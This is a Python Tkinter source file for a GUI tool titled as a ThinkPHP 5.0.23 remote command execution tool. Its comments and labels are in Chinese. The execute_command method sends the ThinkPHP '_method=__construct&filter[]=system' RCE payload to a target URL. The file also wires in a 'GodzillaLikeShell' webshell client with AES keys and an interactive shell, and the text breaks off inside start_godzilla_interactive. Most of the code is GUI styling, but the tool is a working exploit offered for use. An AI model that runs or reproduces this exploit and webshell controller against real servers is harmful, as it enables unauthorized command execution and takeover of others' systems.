import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
import requests
import urllib.parse
import threading
import time
import re
import math
import random
import sys
import os

# 添加当前目录到Python路径，以便能够导入GodzillaLikeShell模块
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# 尝试导入GodzillaLikeShell模块
try:
    from GodzillaLikeShell import GodzillaLikeShell, encrypt, decrypt, generate_encrypted_payload
    HAS_GODZILLA_MODULE = True
except ImportError as e:
    print(f"警告: 无法导入GodzillaLikeShell模块: {e}")
    HAS_GODZILLA_MODULE = False

# RGB颜色生成函数
def get_rgb_color(pos):
    # 颜色循环：红->绿->蓝->红
    if 0 <= pos < 256:
        return (pos, 255-pos, 0)       # 红到绿
    elif 256 <= pos < 512:
        pos -= 256
        return (0, pos, 255-pos)       # 绿到蓝
    else:
        pos -= 512
        return (255-pos, 0, pos)       # 蓝到红

# RGB转十六进制颜色格式
def rgb_to_hex(rgb):
    return '#{:02x}{:02x}{:02x}'.format(*rgb)

class ThinkPHPExploitGUI:
    def __init__(self, root):
        # 设置中文字体支持，为Linux环境添加字体回退
        self.font_family = self._get_suitable_font()
        
        # 主窗口设置
        self.root = root
        self.root.title("ThinkPHP 5.0.23 - 远程命令执行工具")
        self.root.geometry("800x600")
        self.root.configure(bg="#000000")
        
        # 用于解决Windows 11下窗口拖动卡顿的标志
        self.is_dragging = False
        
        # GodzillaLikeShell 相关变量
        self.godzilla_shell = None  # GodzillaLikeShell实例
        self.godzilla_connected = False  # 是否连接到GodzillaLikeShell
        self.godzilla_aes_key = None  # AES加密密钥
        self.godzilla_tab = None  # Godzilla标签页引用
        self.godzilla_result_text = None  # Godzilla结果显示文本框引用
        
        # 初始化RGB动画参数
        self.rgb_pos = 0
        self.title_rgb_pos = 0  # 标题跑马灯的位置
        self.is_running_rgb = True
        self.warning_width = 0
        
        # 开场动画参数
        self.animation_phase = 0  # 0: 滑动动画, 1: 淡出动画, 2: 显示GUI
        self.slide_progress = 0
        self.fade_alpha = 1.0
        self.gui_alpha = 0.0
        
        # 初始化历史命令和回显记录
        self.command_history = []  # 存储历史命令
        self.response_history = []  # 存储回显记录
        self.max_history_size = 50  # 最大历史记录数量
        
        # 监听窗口大小变化事件，动态更新Canvas宽度
        self.root.bind("<Configure>", self.on_window_resize)
        
        # 绑定Enter键执行命令，但确保在按钮创建后再执行
        def on_enter_press(event):
            if hasattr(self, 'execute_btn'):
                self.start_execute()
        self.root.bind("<Return>", on_enter_press)
        
        # 创建开场动画Canvas
        self.splash_canvas = tk.Canvas(root, bg="#000000", highlightthickness=0)
        self.splash_canvas.pack(fill=tk.BOTH, expand=True)
        
        # 创建主框架（初始隐藏）
        self.main_frame = tk.Frame(root, bg="#1E1E1E")
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        self.main_frame.lower(belowThis=self.splash_canvas)
        
        # 创建各个组件
        self.create_title()
        self.create_input_area()
        self.create_button_area()
        self.create_result_area()
        self.create_status_area()
        self.create_red_logo()
        
        # 执行状态标志
        self.is_running = False
        
        # 绑定窗口拖动事件，用于优化动画性能
        self.root.bind("<Button-1>", self.start_drag)
        self.root.bind("<ButtonRelease-1>", self.stop_drag)
        
        # 开始开场动画
        self.root.after(100, self.start_splash_animation)
        
    def start_splash_animation(self):
        # 开始开场动画
        self.root.update()
        self.window_width = self.root.winfo_width()
        self.window_height = self.root.winfo_height()
        
        # 如果窗口尺寸没有获取到，使用默认值
        if self.window_width < 100:
            self.window_width = 800
        if self.window_height < 100:
            self.window_height = 600
            
        # 初始隐藏主GUI
        self.main_frame.lower(belowThis=self.splash_canvas)
        
        # 启动动画循环
        self.splash_animation_loop()
        
    def splash_animation_loop(self):
        # 开场动画主循环
        if self.animation_phase == 0:  # 滑动动画阶段
            self.slide_progress += 0.02  # 增加进度
            
            if self.slide_progress >= 1.0:
                self.slide_progress = 1.0
                self.animation_phase = 1  # 进入淡出阶段
                self.root.after(500, self.splash_animation_loop)  # 短暂停留
                return
                
            self.draw_slide_animation()
            self.root.after(30, self.splash_animation_loop)
            
        elif self.animation_phase == 1:  # 淡出阶段
            self.fade_alpha -= 0.02
            self.gui_alpha += 0.02
            
            if self.fade_alpha <= 0:
                self.fade_alpha = 0
                self.gui_alpha = 1
                self.animation_phase = 2  # 进入完成阶段
                
            self.draw_fade_animation()
            self.root.after(30, self.splash_animation_loop)
            
        else:  # 动画完成
            self.splash_canvas.destroy()
            self.main_frame.lift()
            self.init_rgb_animation()
            
    def draw_slide_animation(self):
        # 绘制滑动动画
        self.splash_canvas.delete("all")
        
        # 计算线条的当前位置
        center_x = self.window_width // 2
        center_y = self.window_height // 2
        
        # 左上到右下的线条
        start_x1 = 0
        start_y1 = 0
        end_x1 = int(self.window_width * self.slide_progress)
        end_y1 = int(self.window_height * self.slide_progress)
        
        # 右上到左下的线条
        start_x2 = self.window_width
        start_y2 = 0
        end_x2 = int(self.window_width * (1 - self.slide_progress))
        end_y2 = int(self.window_height * self.slide_progress)
        
        # 绘制两条RGB线条
        self.draw_rgb_line(start_x1, start_y1, end_x1, end_y1)
        self.draw_rgb_line(start_x2, start_y2, end_x2, end_y2)
        
    def draw_fade_animation(self):
        # 绘制淡出动画
        self.splash_canvas.delete("all")
        
        # 应用透明度效果（通过调整颜色亮度模拟）
        alpha_factor = self.fade_alpha
        
        # 绘制两条逐渐消失的RGB线条
        # 左上到右下的线条
        self.draw_rgb_line(0, 0, self.window_width, self.window_height, alpha_factor)
        # 右上到左下的线条
        self.draw_rgb_line(self.window_width, 0, 0, self.window_height, alpha_factor)
        
        # 更新GUI的显示程度
        if self.gui_alpha > 0:
            # 这里我们使用简单的方式，在动画结束时直接显示GUI
            pass
            
    def draw_rgb_line(self, x1, y1, x2, y2, alpha_factor=1.0):
        # 绘制带有RGB渐变的线条
        # 计算线条的总长度
        dx = x2 - x1
        dy = y2 - y1
        length = math.sqrt(dx*dx + dy*dy)
        
        # 分段绘制线条，每段赋予不同的RGB颜色
        num_segments = max(20, int(length / 5))
        
        for i in range(num_segments):
            # 计算当前段的起始和结束点
            segment_ratio = i / num_segments
            next_segment_ratio = (i + 1) / num_segments
            
            sx = int(x1 + dx * segment_ratio)
            sy = int(y1 + dy * segment_ratio)
            ex = int(x1 + dx * next_segment_ratio)
            ey = int(y1 + dy * next_segment_ratio)
            
            # 获取当前段的RGB颜色，确保颜色变化丰富且过渡柔和
            # 使用随机偏移来增加颜色变化
            color_pos = (self.rgb_pos + i * 10 + random.randint(0, 50)) % 768
            r, g, b = get_rgb_color(color_pos)
            
            # 应用透明度（通过调整颜色亮度）
            r = int(r * alpha_factor)
            g = int(g * alpha_factor)
            b = int(b * alpha_factor)
            
            # 转换为十六进制颜色
            hex_color = '#{:02x}{:02x}{:02x}'.format(r, g, b)
            
            # 绘制线段（增加线条宽度）
            self.splash_canvas.create_line(sx, sy, ex, ey, fill=hex_color, width=6)
        
        # 更新RGB位置，使颜色不断变化
        self.rgb_pos = (self.rgb_pos + 5) % 768
        
    def init_rgb_animation(self):
        # 初始化RGB动画
        # 获取窗口宽度
        self.root.update()
        self.warning_width = self.warning_canvas.winfo_width()
        
        # 如果宽度还是0，设置一个默认值
        if self.warning_width == 0:
            self.warning_width = 800  # 默认窗口宽度
        
        # 在主线程中启动动画循环
        self.rgb_animation()
        
    def _get_suitable_font(self):
        """获取系统上可用的中文字体，解决Linux下中文显示问题"""
        if os.name == 'nt':  # Windows系统
            return "SimHei"
        else:  # Linux/Mac系统
            # 尝试多种常用中文字体
            for font in ["WenQuanYi Micro Hei", "Heiti TC", "SimHei", "WenQuanYi Zen Hei"]:
                # 创建临时标签测试字体是否可用
                temp_label = tk.Label(font=(font, 10))
                # 获取实际使用的字体
                actual_font = temp_label['font'].split()[0]
                # 如果字体名匹配，说明系统支持该字体
                if font.lower() in actual_font.lower():
                    return font
            # 如果没有找到中文字体，返回默认字体
            return "sans-serif"  # 使用系统默认字体
    
    def create_title(self):
        # 创建标题框架并设置为黑色背景
        title_frame = tk.Frame(self.main_frame, bg="#000000")
        title_frame.pack(fill=tk.X, pady=(0, 20))
        
        # 保存标题文本
        self.title_text = "ThinkPHP 5.0.23 远程命令执行工具"
        
        # 创建标题标签并保存引用，用于后续颜色更新
        self.title_label = tk.Label(
            title_frame,
            text=self.title_text,
            font=(self.font_family, 18, "bold"),
            fg="#FFFFFF",
            bg="#000000"
        )
        self.title_label.pack()
        
        # 添加RGB跑马灯警告条（使用Canvas绘制）
        self.warning_canvas = tk.Canvas(title_frame, height=3, bg="#000000", highlightthickness=0)
        self.warning_canvas.pack(fill=tk.X, pady=(10, 0))
        self.warning_width = 0  # 将在组件渲染后更新
        # 保存画布引用，用于后续动画更新
        self.warning_bar = self.warning_canvas
        
    def create_input_area(self):
        # 创建一个框架来容纳Notebook
        notebook_frame = tk.Frame(self.main_frame, bg="#2D2D30")
        notebook_frame.pack(fill=tk.X, pady=(0, 15))
        
        # 创建Notebook控件
        self.tab_control = ttk.Notebook(notebook_frame)
        
        # 配置Notebook样式
        style = ttk.Style()
        style.configure("TNotebook", background="#1A1A1A", tabmargins=0)
        style.configure("TNotebook.Tab", background="#333333", foreground="#CCCCCC", font=(self.font_family, 10), padding=(10, 5))
        style.map("TNotebook.Tab", background=[("selected", "#FF0000")], foreground=[("selected", "#FFFFFF")])
        
        # 创建"单次执行"标签页
        single_exec_frame = ttk.Frame(self.tab_control)
        single_exec_frame.configure(style="Custom.TFrame")
        self.tab_control.add(single_exec_frame, text="单次执行")
        
        # 设置单次执行标签页的背景色
        single_exec_inner = tk.Frame(single_exec_frame, bg="#2D2D30")
        single_exec_inner.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        single_exec_inner.grid_columnconfigure(1, weight=1)
        
        # URL输入框
        url_label = tk.Label(
            single_exec_inner,
            text="目标URL:",
            font=(self.font_family, 10),
            fg="#CCCCCC",
            bg="#1A1A1A",
            anchor="w"
        )
        url_label.grid(row=0, column=0, padx=10, pady=(10, 5), sticky="w")
        
        # 设置URL输入框的默认示例值
        self.url_var = tk.StringVar(value="http://node.hackhub.get-shell.com:63935/?s=captcha")
        self.url_entry = tk.Entry(
            single_exec_inner,
            textvariable=self.url_var,
            font=(self.font_family, 10),
            bg="#1A1A1A",
            fg="#FFFFFF",
            insertbackground="#FFFFFF",
            relief=tk.FLAT,
            bd=1,
            highlightbackground="#333333",
            highlightcolor="#FF0000"
        )
        self.url_entry.grid(row=1, column=0, columnspan=2, padx=10, pady=(0, 10), sticky="ew")
        self.url_entry.bind("<FocusIn>", lambda e: self.url_entry.config(highlightthickness=1))
        self.url_entry.bind("<FocusOut>", lambda e: self.url_entry.config(highlightthickness=0))
        
        # 命令输入框
        cmd_label = tk.Label(
            single_exec_inner,
            text="执行命令:",
            font=(self.font_family, 10),
            fg="#CCCCCC",
            bg="#1A1A1A",
            anchor="w"
        )
        cmd_label.grid(row=2, column=0, padx=10, pady=(10, 5), sticky="w")
        
        self.cmd_var = tk.StringVar(value="id")
        self.cmd_entry = tk.Entry(
            single_exec_inner,
            textvariable=self.cmd_var,
            font=(self.font_family, 10),
            bg="#1A1A1A",
            fg="#FFFFFF",
            insertbackground="#FFFFFF",
            relief=tk.FLAT,
            bd=1,
            highlightbackground="#333333",
            highlightcolor="#FF0000"
        )
        self.cmd_entry.grid(row=3, column=0, columnspan=2, padx=10, pady=(0, 15), sticky="ew")
        self.cmd_entry.bind("<FocusIn>", lambda e: self.cmd_entry.config(highlightthickness=1))
        self.cmd_entry.bind("<FocusOut>", lambda e: self.cmd_entry.config(highlightthickness=0))
        
        # 创建"GodzillaShell"标签页（如果GodzillaLikeShell模块已加载）
        if HAS_GODZILLA_MODULE:
            self.godzilla_tab = ttk.Frame(self.tab_control)
            self.tab_control.add(self.godzilla_tab, text="GodzillaShell")
            
            # 设置GodzillaShell标签页的背景色
            godzilla_inner = tk.Frame(self.godzilla_tab, bg="#2D2D30")
            godzilla_inner.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            godzilla_inner.grid_columnconfigure(1, weight=1)
            
            # URL输入框
            godzilla_url_label = tk.Label(
                godzilla_inner,
                text="目标URL:",
                font=(self.font_family, 10),
                fg="#CCCCCC",
                bg="#1A1A1A",
                anchor="w"
            )
            godzilla_url_label.grid(row=0, column=0, padx=10, pady=(10, 5), sticky="w")
            
            # 共享主URL输入框的值
            self.godzilla_url_entry = tk.Entry(
                godzilla_inner,
                textvariable=self.url_var,
                font=(self.font_family, 10),
                bg="#1A1A1A",
                fg="#FFFFFF",
                insertbackground="#FFFFFF",
                relief=tk.FLAT,
                bd=1,
                highlightbackground="#333333",
                highlightcolor="#FF0000"
            )
            self.godzilla_url_entry.grid(row=1, column=0, columnspan=2, padx=10, pady=(0, 10), sticky="ew")
            
            # AES密钥输入框
            aes_key_label = tk.Label(
                godzilla_inner,
                text="AES密钥:",
                font=(self.font_family, 10),
                fg="#CCCCCC",
                bg="#1A1A1A",
                anchor="w"
            )
            aes_key_label.grid(row=2, column=0, padx=10, pady=(10, 5), sticky="w")
            
            self.aes_key_var = tk.StringVar()
            self.aes_key_entry = tk.Entry(
                godzilla_inner,
                textvariable=self.aes_key_var,
                font=(self.font_family, 10),
                bg="#1A1A1A",
                fg="#FFFFFF",
                insertbackground="#FFFFFF",
                relief=tk.FLAT,
                bd=1,
                highlightbackground="#333333",
                highlightcolor="#FF0000",
                show="*"  # 密码模式，隐藏输入
            )
            self.aes_key_entry.grid(row=3, column=0, padx=10, pady=(0, 10), sticky="ew")
            
            # 生成密钥按钮
            generate_key_btn = tk.Button(
                godzilla_inner,
                text="生成密钥",
                font=(self.font_family, 8),
                bg="#333333",
                fg="#CCCCCC",
                relief=tk.RAISED,
                bd=1,
                cursor="hand2",
                command=self.generate_aes_key
            )
            generate_key_btn.grid(row=3, column=1, padx=(5, 10), pady=(0, 10), sticky="w")
            
            # 连接状态标签
            self.godzilla_status_var = tk.StringVar(value="未连接")
            self.godzilla_status_label = tk.Label(
                godzilla_inner,
                textvariable=self.godzilla_status_var,
                font=(self.font_family, 10, "bold"),
                fg="#FF0000",
                bg="#1A1A1A",
                anchor="w"
            )
            self.godzilla_status_label.grid(row=4, column=0, columnspan=2, padx=10, pady=(10, 5), sticky="w")
            
            # 连接/断开按钮
            self.godzilla_connect_btn = tk.Button(
                godzilla_inner,
                text="连接Shell",
                font=(self.font_family, 10),
                bg="#4CAF50",
                fg="#FFFFFF",
                relief=tk.RAISED,
                bd=2,
                cursor="hand2",
                command=self.connect_godzilla_shell
            )
            self.godzilla_connect_btn.grid(row=5, column=0, columnspan=2, padx=10, pady=(0, 15), sticky="ew")
        
        # 显示Notebook
        self.tab_control.pack(fill=tk.X, expand=False)
        
    def create_button_area(self):
        # 创建按钮框架并设置为黑色背景
        button_frame = tk.Frame(self.main_frame, bg="#000000")
        button_frame.pack(fill=tk.X, pady=(0, 15))
        
        # 创建执行按钮
        self.execute_btn = tk.Button(
            button_frame,
            text="执行命令",
            font=(self.font_family, 10, "bold"),
            bg="#FF0000",
            fg="#FFFFFF",
            relief=tk.RAISED,
            bd=2,
            cursor="hand2",
            command=self.start_execute
        )
        self.execute_btn.pack(side=tk.LEFT, padx=10)
        
        # 如果Godzilla模块已加载，添加GodzillaShell相关按钮
        if HAS_GODZILLA_MODULE:
            # GodzillaShell交互按钮
            self.godzilla_interactive_btn = tk.Button(
                button_frame,
                text="交互式Shell",
                font=(self.font_family, 10),
                bg="#2196F3",
                fg="#FFFFFF",
                relief=tk.RAISED,
                bd=2,
                cursor="hand2",
                command=self.start_godzilla_interactive
            )
            self.godzilla_interactive_btn.pack(side=tk.LEFT, padx=5)
            self.godzilla_interactive_btn.config(state=tk.DISABLED)  # 初始禁用
        
        # 创建清空按钮
        self.clear_btn = tk.Button(
            button_frame,
            text="清空输出",
            font=(self.font_family, 10),
            bg="#333333",
            fg="#CCCCCC",
            relief=tk.RAISED,
            bd=2,
            cursor="hand2",
            command=self.clear_output
        )
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        # 创建保存按钮
        self.save_btn = tk.Button(
            button_frame,
            text="保存输出",
            font=(self.font_family, 10),
            bg="#333333",
            fg="#CCCCCC",
            relief=tk.RAISED,
            bd=2,
            cursor="hand2",
            command=self.save_output
        )
        self.save_btn.pack(side=tk.LEFT, padx=5)
        
        # 创建回显记录按钮
        self.response_btn = tk.Button(
            button_frame,
            text="回显记录",
            font=(self.font_family, 10),
            bg="#333333",
            fg="#CCCCCC",
            relief=tk.RAISED,
            bd=2,
            cursor="hand2",
            command=self.show_response_history
        )
        self.response_btn.pack(side=tk.LEFT, padx=5)
        
    def create_red_logo(self):
        # 在保存按钮右侧创建一个小的红色标志
        # 首先获取保存按钮的位置和尺寸
        button_frame = self.save_btn.master
        
        # 创建一个Canvas来绘制红色标志
        self.logo_canvas = tk.Canvas(
            button_frame,
            width=30,
            height=25,
            bg="#000000",
            highlightthickness=0
        )
        self.logo_canvas.pack(side=tk.LEFT, padx=10)
        
        # 绘制一个简化的ROG风格红色标志
        # 主形状 - 多边形
        self.logo_canvas.create_polygon(
            15, 5,
            25, 20,
            15, 15,
            5, 20,
            fill="#FF0000",
            outline="#FFFFFF"
        )
        
        # 内部形状 - 增加标志的立体感
        self.logo_canvas.create_polygon(
            15, 7,
            22, 17,
            15, 13,
            8, 17,
            fill="#CC0000",
            outline=""
        )
        
        # 添加一些装饰线条增强视觉效果
        self.logo_canvas.create_line(10, 10, 20, 10, fill="#FFFFFF", width=1)
        self.logo_canvas.create_line(10, 12, 18, 12, fill="#FFFFFF", width=1)
        
    def create_result_area(self):
        # 创建结果框架
        result_frame = tk.Frame(self.main_frame, bg="#1A1A1A")
        result_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 15))
        
        # 创建Notebook来显示不同的结果区域
        self.result_notebook = ttk.Notebook(result_frame)
        
        # 配置Notebook样式
        style = ttk.Style()
        style.configure("Result.TNotebook", background="#1A1A1A", tabmargins=0)
        style.configure("Result.TNotebook.Tab", background="#333333", foreground="#CCCCCC", font=(self.font_family, 9), padding=(8, 3))
        style.map("Result.TNotebook.Tab", background=[("selected", "#FF0000")], foreground=[("selected", "#FFFFFF")])
        self.result_notebook.configure(style="Result.TNotebook")
        
        # 创建单次执行结果标签页
        single_result_frame = ttk.Frame(self.result_notebook)
        self.result_notebook.add(single_result_frame, text="单次执行结果")
        
        # 设置单次执行结果标签页的背景色
        single_result_inner = tk.Frame(single_result_frame, bg="#1A1A1A")
        single_result_inner.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # 创建单次执行结果文本框
        self.result_text = scrolledtext.ScrolledText(
            single_result_inner,
            font=(self.font_family, 10),
            bg="#000000",
            fg="#FFFFFF",
            insertbackground="#FFFFFF",
            relief=tk.FLAT,
            bd=1,
            highlightbackground="#333333"
        )
        self.result_text.pack(fill=tk.BOTH, expand=True, padx=3, pady=3)
        
        # 配置文本标签样式
        self.result_text.tag_config("info", foreground="#4EC9B0", font=(self.font_family, 10))
        self.result_text.tag_config("highlight", foreground="#FFD700", font=(self.font_family, 10, "bold"))
        self.result_text.tag_config("error", foreground="#FF0000", font=(self.font_family, 10, "bold"))
        
        # 如果Godzilla模块已加载，创建GodzillaShell结果标签页
        if HAS_GODZILLA_MODULE:
            godzilla_result_frame = ttk.Frame(self.result_notebook)
            self.result_notebook.add(godzilla_result_frame, text="GodzillaShell结果")
            
            # 设置GodzillaShell结果标签页的背景色
            godzilla_result_inner = tk.Frame(godzilla_result_frame, bg="#1A1A1A")
            godzilla_result_inner.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
            
            # 创建GodzillaShell结果文本框
            self.godzilla_result_text = scrolledtext.ScrolledText(
                godzilla_result_inner,
                font=(self.font_family, 10),
                bg="#000000",
                fg="#FFFFFF",
                insertbackground="#FFFFFF",
                relief=tk.FLAT,
                bd=1,
                highlightbackground="#333333"
            )
            self.godzilla_result_text.pack(fill=tk.BOTH, expand=True, padx=3, pady=3)
            
            # 配置GodzillaShell文本标签样式
            self.godzilla_result_text.tag_config("info", foreground="#4EC9B0", font=(self.font_family, 10))
            self.godzilla_result_text.tag_config("highlight", foreground="#FFD700", font=(self.font_family, 10, "bold"))
            self.godzilla_result_text.tag_config("error", foreground="#FF0000", font=(self.font_family, 10, "bold"))
            
            # 添加提示信息
            prompt_label = tk.Label(
                godzilla_result_inner,
                text="请使用交互式Shell执行命令",
                font=(self.font_family, 9),
                fg="#AAAAAA",
                bg="#1A1A1A"
            )
            prompt_label.pack(pady=5, padx=3, anchor="w")
        
        # 显示结果Notebook
        self.result_notebook.pack(fill=tk.BOTH, expand=True)
        
    def create_status_area(self):
        # 创建状态框架
        status_frame = tk.Frame(self.main_frame, bg="#1A1A1A")
        status_frame.pack(fill=tk.X, pady=(0, 10))
        
        # 创建状态标签
        self.status_var = tk.StringVar(value="就绪")
        status_label = tk.Label(
            status_frame,
            textvariable=self.status_var,
            font=(self.font_family, 10),
            fg="#CCCCCC",
            bg="#1A1A1A",
            anchor="w"
        )
        status_label.pack(side=tk.LEFT, padx=10, pady=5)
        
        # 创建进度条
        self.progress_var = tk.IntVar(value=0)
        self.progress_bar = ttk.Progressbar(
            status_frame,
            orient="horizontal",
            length=100,
            mode="determinate",
            variable=self.progress_var,
            style="TProgressbar"
        )
        self.progress_bar.pack(side=tk.RIGHT, padx=10, pady=5, fill=tk.X, expand=True)
        
    def start_execute(self):
        # 检查URL是否为空
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("错误", "URL不能为空！")
            return
        
        # 禁用执行按钮，防止重复点击
        self.execute_btn.config(state=tk.DISABLED)
        self.is_running = True
        
        # 更新状态
        self.status_var.set("正在执行命令...")
        
        # 在新线程中执行命令
        threading.Thread(target=self.execute_command, daemon=True).start()
        
        # 启动进度条动画
        threading.Thread(target=self.update_progress, daemon=True).start()
        
    def execute_command(self):
        try:
            url = self.url_var.get().strip()
            command = self.cmd_var.get().strip()
            if not command:
                command = "id"
            
            # 从URL中提取主机信息
            parsed_url = urllib.parse.urlparse(url)
            host = parsed_url.netloc
            
            # 对命令进行URL编码
            encoded_command = urllib.parse.quote(command)
            
            headers = {
                "Host": host,
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Referer": url,
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh,zh-CN;q=0.9"
            }
            
            data = f"_method=__construct&filter%5B%5D=system&method=get&server%5BREQUEST_METHOD%5D={encoded_command}"
            
            # 保存请求数据，用于后续显示在回显历史的顶部栏
            request_data = {
                "url": url,
                "headers": headers,
                "data": data,
                "command": command
            }
            
            # 发送请求
            response = requests.post(url, headers=headers, data=data, timeout=30)
            
            # 在主线程中更新结果文本
            self.root.after(0, self.update_result, command, response.text, request_data)
            
        except Exception as e:
            # 在主线程中显示错误
            self.root.after(0, self.show_error, str(e))
        finally:
            # 在主线程中恢复按钮状态
            self.root.after(0, self.reset_ui)
        
    def update_progress(self):
        # 循环更新进度条，直到执行完成
        while self.is_running:
            # 使用RGB颜色更新进度条样式
            try:
                style = ttk.Style()
                rgb_color = get_rgb_color(self.rgb_pos)
                hex_color = rgb_to_hex(rgb_color)
                style.configure("TProgressbar", troughcolor="#1A1A1A", background=hex_color)
            except:
                pass
                
            # 更新进度值
            for i in range(101):
                if not self.is_running:
                    break
                self.progress_var.set(i)
                time.sleep(0.01)
            # 进度条回退
            for i in range(100, -1, -1):
                if not self.is_running:
                    break
                self.progress_var.set(i)
                time.sleep(0.005)
                
    def log_godzilla(self, message):
        # 添加信息到GodzillaShell结果区域
        if HAS_GODZILLA_MODULE and hasattr(self, 'godzilla_result_text'):
            self.godzilla_result_text.config(state=tk.NORMAL)
            if message.startswith("执行命令:"):
                self.godzilla_result_text.insert(tk.END, message + "\n", "highlight")
            elif "发生错误" in message:
                self.godzilla_result_text.insert(tk.END, message + "\n", "error")
            else:
                self.godzilla_result_text.insert(tk.END, message + "\n")
            self.godzilla_result_text.see(tk.END)
            self.godzilla_result_text.config(state=tk.DISABLED)
    
    def log_info(self, message):
        # 记录信息日志
        print(f"[*] {message}")
        if HAS_GODZILLA_MODULE and hasattr(self, 'godzilla_result_text'):
            self.godzilla_result_text.config(state=tk.NORMAL)
            self.godzilla_result_text.insert(tk.END, f"[*] {message}\n")
            self.godzilla_result_text.see(tk.END)
            self.godzilla_result_text.config(state=tk.DISABLED)
    
    def log_error(self, message):
        # 记录错误日志
        print(f"[-] {message}")
        if HAS_GODZILLA_MODULE and hasattr(self, 'godzilla_result_text'):
            self.godzilla_result_text.config(state=tk.NORMAL)
            self.godzilla_result_text.insert(tk.END, f"[-] {message}\n", "error")
            self.godzilla_result_text.see(tk.END)
            self.godzilla_result_text.config(state=tk.DISABLED)

    # GodzillaLikeShell相关方法
    def generate_aes_key(self):
        """生成随机AES密钥"""
        import random
        import string
        # 生成32字节的随机密钥（用于AES-256）
        key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
        self.aes_key_var.set(key)
        self.log_info("已生成随机AES密钥：{}".format(key))

    def connect_godzilla_shell(self):
        """连接到GodzillaLikeShell，优化Windows 11下全屏时的连接体验"""
        if not HAS_GODZILLA_MODULE:
            self.log_error("Godzilla模块未加载")
            return
            
        url = self.url_var.get()
        if not url:
            self.log_error("请输入目标URL")
            return
            
        aes_key = self.aes_key_var.get()
        if not aes_key:
            self.log_error("请输入或生成AES密钥")
            return
            
        try:
            # 创建GodzillaLikeShell实例
            self.log_info(f"正在创建GodzillaLikeShell实例，目标URL: {url}")
            self.godzilla_shell = GodzillaLikeShell(url, aes_key)
            self.log_info(f"GodzillaLikeShell实例创建成功，AES密钥: {aes_key}")
            
            # 设置状态标签为连接中
            self.godzilla_status_var.set("连接中...")
            self.godzilla_status_label.config(fg="#FFFF00")
            
            # 优化：使用update_idletasks而不是update，避免在Windows 11全屏时卡住
            self.root.update_idletasks()
            
            # 添加超时处理
            import threading
            timeout_event = threading.Event()
            
            def init_session_with_timeout():
                try:
                    # 初始化会话
                    self.log_info("开始初始化GodzillaShell会话...")
                    connected = self.godzilla_shell.init_session()
                    if not timeout_event.is_set():
                        # 如果未超时，更新UI状态
                        self.root.after(0, lambda c=connected: self.update_connection_status(c))
                except Exception as e:
                    if not timeout_event.is_set():
                        detailed_error = f"会话初始化异常: {str(e)}"
                        self.log_error(detailed_error)
                        self.root.after(0, lambda err=detailed_error: self.handle_connection_error(err))
            
            # 启动会话初始化线程
            self.log_info("启动会话初始化线程...")
            thread = threading.Thread(target=init_session_with_timeout)
            thread.daemon = True
            thread.start()
            
            # 设置超时检查
            def check_timeout():
                if thread.is_alive():
                    # 增加超时时间到15秒以提高成功率
                    self.log_info("会话初始化中，将在15秒后检查是否超时...")
                    # 优化：定期更新UI以防止在Windows 11全屏时卡住
                    def periodic_ui_update(count=0):
                        if thread.is_alive() and count < 15:
                            self.root.update_idletasks()
                            self.root.after(1000, periodic_ui_update, count + 1)
                        elif thread.is_alive():
                            self.handle_connection_timeout(thread, timeout_event)
                    
                    self.root.after(100, periodic_ui_update)
                
            self.root.after(100, check_timeout)
        except Exception as e:
            detailed_error = f"连接GodzillaShell时发生错误: {str(e)}"
            self.log_error(detailed_error)
            self.godzilla_status_var.set("连接失败")
            self.godzilla_status_label.config(fg="#FF0000")
            # 确保UI更新
            self.root.update_idletasks()
            
    def update_connection_status(self, connected):
        """更新连接状态"""
        if connected:
            self.godzilla_connected = True
            self.log_info("GodzillaShell连接成功！会话ID: {}".format(self.godzilla_shell.session_id))
            self.godzilla_status_var.set("已连接")
            self.godzilla_status_label.config(fg="#00FF00")
            # 启用相关按钮
            self.godzilla_interactive_btn.config(state=tk.NORMAL)
            self.godzilla_connect_btn.config(state=tk.DISABLED)
        else:
            self.log_error("GodzillaShell连接失败")
            self.godzilla_status_var.set("连接失败")
            self.godzilla_status_label.config(fg="#FF0000")
            
    def handle_connection_error(self, error_msg):
        """处理连接错误"""
        self.log_error("连接GodzillaShell时发生错误: {}".format(error_msg))
        try:
            self.godzilla_status_var.set("连接失败")
            self.godzilla_status_label.config(fg="#FF0000")
            # 强制更新UI
            self.root.update_idletasks()
        except Exception as ui_error:
            self.log_error(f"更新UI状态时发生错误: {str(ui_error)}")
        
    def handle_connection_timeout(self, thread, timeout_event):
        """处理连接超时"""
        if thread.is_alive():
            timeout_event.set()
            self.log_error("GodzillaShell连接超时")
            try:
                self.godzilla_status_var.set("连接失败")
                self.godzilla_status_label.config(fg="#FF0000")
                # 强制更新UI
                self.root.update_idletasks()
            except Exception as ui_error:
                self.log_error(f"更新UI状态时发生错误: {str(ui_error)}")

    def disconnect_godzilla_shell(self):
        """断开GodzillaLikeShell连接"""
        if not HAS_GODZILLA_MODULE or not self.godzilla_connected:
            return
            
        try:
            # 关闭会话
            if hasattr(self.godzilla_shell, 'close_session'):
                self.godzilla_shell.close_session()
                
            self.godzilla_connected = False
            self.godzilla_shell = None
            self.log_info("GodzillaShell已断开连接")
            self.godzilla_status_var.set("未连接")
            self.godzilla_status_label.config(fg="#FF0000")
            # 禁用相关按钮
            self.godzilla_interactive_btn.config(state=tk.DISABLED)
            self.godzilla_connect_btn.config(state=tk.NORMAL)
        except Exception as e:
            self.log_error("断开GodzillaShell连接时发生错误: {}".format(str(e)))



    def start_godzilla_interactive(self):
